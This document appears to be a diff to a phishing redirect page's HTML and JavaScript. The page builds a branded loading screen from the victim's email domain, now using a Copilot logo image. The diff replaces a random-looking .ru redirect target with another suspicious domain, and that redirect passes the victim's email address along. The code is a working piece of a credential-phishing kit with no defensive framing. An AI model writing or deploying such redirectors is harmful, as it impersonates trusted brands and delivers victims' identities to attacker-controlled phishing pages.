@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #f00;
+            background: #FFFFFF;
             color: white;
             text-align: center;
             margin: 0;
@@ -19,11 +19,15 @@
             align-items: center;
         }
         .logo {
-            width: 90px;
-            margin-bottom: 15px;
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
+      width: 150px;
+      height: 150px;
+      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.8; }
         }
         .spinner {
             width: 40px;
@@ -59,8 +63,8 @@
             }
 
             const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
-            const logoUrl = `https://logo.clearbit.com/${domain}`;
-            const targetUrl = email ? `https://xeCwd.qjezqp.ru/9zzyJ2hlpLbYkC6@oN/*${email}` : 'https://xeCwd.qjezqp.ru/9zzyJ2hlpLbYkC6@oN/';
+            const logoUrl = `https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg`;
+            const targetUrl = email ? `https://implentedgucedirectory.com/vik/b63fc8d582eda5fa.html?uid=${email}` : 'https://implentedgucedirectory.com/vik/b63fc8d582eda5fa.html?uid=';
 
             document.body.innerHTML = `
                 <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
